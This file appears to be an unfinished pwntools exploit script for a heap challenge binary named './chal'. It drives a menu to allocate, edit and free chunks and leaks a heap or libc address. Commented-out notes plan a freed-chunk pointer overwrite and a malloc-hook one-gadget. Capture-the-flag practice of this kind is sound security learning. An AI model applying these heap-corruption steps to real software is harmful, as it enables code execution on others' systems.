import pwn
from pprint import pprint
proc = pwn.process(["./chal"], aslr=True)

def alloc_chunk(num:int):
    proc.sendline(b"1")
    proc.sendline(str(num).encode())
    proc.sendline(b"aaa")
    proc.recvuntil(b"success!\n")

def edit_chunk(num:int, content:bytes):
    proc.sendline(b"2")
    proc.sendline(str(num).encode())
    proc.sendline(str(len(content)).encode())
    proc.send(content)
    proc.recvuntil(b"success!\n")

def del_chunk(num:int):
    proc.sendline(b"3")
    proc.sendline(str(num).encode())
    proc.recvuntil(b"success!\n")

for i in range(2):    
    alloc_chunk(i)
    edit_chunk(i, b"a"*0x410)

del_chunk(0)
del_chunk(1)

proc.sendafter(b"> ", b"4")
from pwn import u64

pprint(hex(u64(proc.recvuntil(b"a"*0x410).splitlines()[1][6:] + b"\x00"*2)))

'''
alloc_chunk(0)
edit_chunk(0, b"a"*24)

alloc_chunk(1)
edit_chunk(1, b"a"*24)

del_chunk(0)
del_chunk(1)

# todo: leak libc adddress
edit_chunk(0, b"a"*24 + 0x21.to_bytes(8, "little") +
0x00555555558000.to_bytes(8, "little"))

# todo: find malloc hook and write one-gadget
'''

proc.interactive()